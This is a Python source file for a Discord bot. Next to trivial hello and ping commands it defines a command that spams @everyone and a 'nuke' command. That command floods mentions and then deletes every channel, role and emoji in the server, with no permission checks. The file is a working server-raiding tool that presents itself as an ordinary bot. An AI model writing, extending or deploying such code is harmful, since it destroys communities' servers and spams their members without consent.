import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='?', intents=discord.Intents.all())

@bot.event
async def on_ready():
    print('Logged in as ' + bot.user.name + '!')

    @bot.event
    async def on_message(message):
        await bot.process_commands(message)

    @bot.command(name='hello')
    async def hello(ctx):
        await ctx.send('Hello There!')

    @bot.command(name='ping')
    async def ping(ctx):
        await ctx.send(f'Your ping is: ||{round(bot.latency * 1000)} ms||')

    @bot.command(name='thats_all')
    async def spammer(ctx):
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')

@bot.command()
async def nuke(ctx):
    for channel in ctx.guild.channels:
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        await ctx.send('@everyone')
        pass
        try:
            await channel.delete()
        except:
            pass
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except:
            pass

bot.run('YOUR DISCORD BOT TOKEN')
